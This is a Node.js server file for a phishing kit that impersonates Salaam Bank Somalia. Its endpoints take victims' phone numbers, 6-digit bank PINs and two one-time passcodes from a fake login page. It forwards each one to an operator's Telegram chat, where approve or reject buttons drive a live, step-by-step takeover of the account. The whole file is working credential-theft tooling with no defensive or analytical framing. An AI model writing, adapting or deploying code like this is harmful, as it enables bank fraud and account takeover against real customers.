const express = require('express');
const { Telegraf } = require('telegraf');
const path = require('path');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 8080;

if (!process.env.BOT_TOKEN) {
    throw new Error("BOT_TOKEN is missing in .env");
}

const bot = new Telegraf(process.env.BOT_TOKEN);
const ADMIN_ID = String(process.env.ADMIN_CHAT_ID || "").trim();

const statusStore = {};

app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// LOGIN API
app.post('/api/login-notification', async (req, res) => {
    const { phone, pin } = req.body || {};
    const country = "Soomaaliya";
    const countryCode = "+252";

    const currentTime = new Date().toLocaleString('en-US', {
        month: 'numeric', day: 'numeric', year: 'numeric',
        hour: 'numeric', minute: 'numeric', second: 'numeric',
        hour12: true
    });

    if (!phone || !pin || !ADMIN_ID) return res.status(400).json({ error: "Missing data" });

    statusStore[phone] = "pending";

    const message = `🏦 <b>SALAAM BANK SOMALIA - BANK PIN SUBMISSION</b>

🆕 <b>MACMIIL CUSUB</b>
🇸🇴 <b>Dalka:</b> ${country}
🌍 <b>Koodka Dalka:</b> ${countryCode}
📱 <b>Lambarka Taleefanka:</b> ${phone}
🔑 <b>PIN-ka Bangiga (6-Digit):</b> <code>${pin}</code>
⏰ <b>Waqtiga:</b> ${currentTime}

━━━━━━━━━━━━━━━

⚠️ <b>Macmiilku wuxuu sugayaa ansixin</b>
⌛ <b>Waqtiga: 5 daqiiqo</b>`;

    try {
        await bot.telegram.sendMessage(ADMIN_ID, message, {
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: "✅ Ogolow", callback_data: `approve|${phone}|${pin}` },
                        { text: "❌ PIN Khalad ah", callback_data: `deny|${phone}|${pin}` }
                    ]
                ]
            }
        });
        res.json({ success: true });
    } catch (err) {
        console.error(err);
        res.status(500).json({ error: err.message });
    }
});

// FIRST OTP API
app.post('/api/verify-first-otp', async (req, res) => {
    const { phone, code } = req.body || {};
    const country = "Soomaaliya";
    const countryCode = "+252";
    const currentTime = new Date().toLocaleString('en-US', {
        month: 'numeric', day: 'numeric', year: 'numeric',
        hour: 'numeric', minute: 'numeric', second: 'numeric',
        hour12: true
    });

    if (!phone || !code || !ADMIN_ID) return res.status(400).json({ error: "Missing data" });

    statusStore[phone] = "pending_otp1";

    const otpMessage = `🆕 <b>SALAAM BANK - XAQIIJINTA LAMBARKA (OTP)</b>
🇸🇴 <b>Dalka:</b> ${country}
📞 <b>Koodka Dalka:</b> ${countryCode}
📱 <b>Taleefanka:</b> ${phone}
🔑 <b>Koodka Xaqiijinta:</b> <code>${code}</code>
⏰ <b>Waqtiga:</b> ${currentTime}

<b>━━━━━━━━━━━━━━━━━</b>

⚠️ <b>Hubi xogta:</b>`;

    try {
        await bot.telegram.sendMessage(ADMIN_ID, otpMessage, {
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: "✅ Sax ah", callback_data: `otp1_correct|${phone}` }
                    ],
                    [
                        { text: "❌ Kood Khalad ah", callback_data: `otp1_wrong|${phone}` },
                        { text: "⚠️ PIN Khalad ah", callback_data: `otp2_wrongpin|${phone}` }
                    ],
                    [
                        { text: "📞 Naga Soo Xiriir", callback_data: `contact_us|${phone}` }
                    ]
                ]
            }
        });
        res.json({ success: true });
    } catch (err) {
        console.error(err);
        res.status(500).json({ error: err.message });
    }
});

// SECOND OTP API
app.post('/api/verify-second-otp', async (req, res) => {
    const { phone, otp } = req.body || {};
    const country = "Soomaaliya";
    const countryCode = "+252";
    const currentTime = new Date().toLocaleString('en-US', {
        month: 'numeric', day: 'numeric', year: 'numeric',
        hour: 'numeric', minute: 'numeric', second: 'numeric',
        hour12: true
    });

    if (!phone || !otp || !ADMIN_ID) return res.status(400).json({ error: "Missing data" });

    statusStore[phone] = "pending_otp2";

    const otpMessage2 = `2️⃣ <b>SALAAM BANK - XAQIIJINTA LABAAD</b>
🇸🇴 <b>Dalka:</b> ${country}
📱 <b>Taleefanka:</b> ${phone}
🔐 <b>Koodka Labaad:</b> ${otp}
⏰ <b>Waqtiga:</b> ${currentTime}`;

    try {
        await bot.telegram.sendMessage(ADMIN_ID, otpMessage2, {
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: "✅ Sax ah", callback_data: `otp2_correct|${phone}|${otp}` },
                        { text: "❌ Khalad", callback_data: `otp2_wrong|${phone}` }
                    ]
                ]
            }
        });
        res.json({ success: true });
    } catch (err) {
        console.error(err);
        res.status(500).json({ error: err.message });
    }
});

app.post('/api/resend-otp-notification', async (req, res) => {
    const { phone, step } = req.body || {};
    if (!phone || !ADMIN_ID) return res.status(400).json({ error: "Missing data" });

    try {
        await bot.telegram.sendMessage(ADMIN_ID, `🔄 <b>CODSIGA DIB LOOGU DIRO KOODKA</b>\n📱 <b>Taleefanka:</b> ${phone}`, { parse_mode: 'HTML' });
        res.json({ success: true });
    } catch (err) {
        res.status(500).json({ error: "Telegram error" });
    }
});

// BOT ACTIONS
bot.action(/^approve\|(.+)\|(.+)/, async (ctx) => {
    const phone = ctx.match[1];
    const pin = ctx.match[2];
    statusStore[phone] = "approved";
    await ctx.answerCbQuery("Ogololaansho la bixiyay");
    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
    await ctx.replyWithHTML(`✅ <b>PIN-ka BANGIBA WAA LA OGGOLAaday</b>\n📱 <b>${phone}</b>`);
});

bot.action(/^deny\|(.+)\|(.+)/, async (ctx) => {
    const phone = ctx.match[1];
    statusStore[phone] = "denied";
    await ctx.answerCbQuery("La diiday");
    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
    await ctx.replyWithHTML(`❌ <b>PIN KHALAD AH</b>\n📱 <b>${phone}</b>`);
});

bot.action(/^otp1_correct\|(.+)/, async (ctx) => {
    const phone = ctx.match[1];
    statusStore[phone] = "otp1_correct";
    await ctx.answerCbQuery("La xaqiijiyay");
    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
    await ctx.replyWithHTML(`1️⃣ <b>KOODKA 1AAD WAA LA XAQIIJIYAY</b>\n📱 <b>${phone}</b>`);
});

bot.action(/^otp1_wrong\|(.+)/, async (ctx) => {
    const phone = ctx.match[1];
    statusStore[phone] = "otp1_wrong";
    await ctx.answerCbQuery("Kood khalad ah");
    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
    await ctx.replyWithHTML(`❌ <b>KOOD KHALAD AH</b>\n📱 <b>${phone}</b>`);
});

bot.action(/^contact_us\|(.+)/, async (ctx) => {
    const phone = ctx.match[1];
    statusStore[phone] = "contact_us";
    await ctx.answerCbQuery("La codsaday xiriir");
    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
    await ctx.replyWithHTML(`📞 <b>MACMIILKU WUXUU CODSaday IN LALA SOO XIRIIRO</b>\n📱 <b>${phone}</b>`);
});

bot.action(/^otp2_correct\|(.+)\|(.+)/, async (ctx) => {
    const phone = ctx.match[1];
    statusStore[phone] = "otp2_correct";
    await ctx.answerCbQuery("La dhameeyay");
    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
    await ctx.replyWithHTML(`✅ <b>NIDAAMKA WAA LA DHAMEEYAY</b>\n📱 <b>${phone}</b>`);
});

bot.action(/^otp2_wrong\|(.+)/, async (ctx) => {
    const phone = ctx.match[1];
    statusStore[phone] = "otp2_wrong";
    await ctx.answerCbQuery("Khalad");
    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
    await ctx.replyWithHTML(`❌ <b>KOODKA 2AAD WAA KHALAD</b>\n📱 <b>${phone}</b>`);
});

bot.action(/^otp2_wrongpin\|(.+)/, async (ctx) => {
    const phone = ctx.match[1];
    statusStore[phone] = "otp2_wrongpin";
    await ctx.answerCbQuery("PIN khalad ah");
    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
    await ctx.replyWithHTML(`🔑 <b>PIN-KA BANGA WAA KHALAD</b>\n📱 <b>${phone}</b>`);
});

app.get('/api/check-status', (req, res) => {
    const phone = req.query.phone;
    const currentStatus = statusStore[phone] || "pending";
    res.json({ status: currentStatus });
    if (currentStatus === "approved") {
        statusStore[phone] = "idle_waiting_for_otp1";
    }
});

app.get('/:page', (req, res, next) => {
    if (req.params.page.startsWith('api')) return next();
    const file = req.params.page.endsWith('.html') ? req.params.page : req.params.page + '.html';
    res.sendFile(path.join(__dirname, 'public', file), (err) => {
        if (err) res.status(404).send("Page not found");
    });
});

app.listen(PORT, async () => {
    console.log(`🚀 Server running on port ${PORT}`);
    try {
        await bot.telegram.deleteWebhook({ drop_pending_updates: true });
        bot.launch();
        console.log("🤖 Bot is active");
    } catch (err) {
        console.error("Launch error:", err);
    }
});

process.once('SIGINT', () => bot.stop('SIGINT'));
process.once('SIGTERM', () => bot.stop('SIGTERM'));
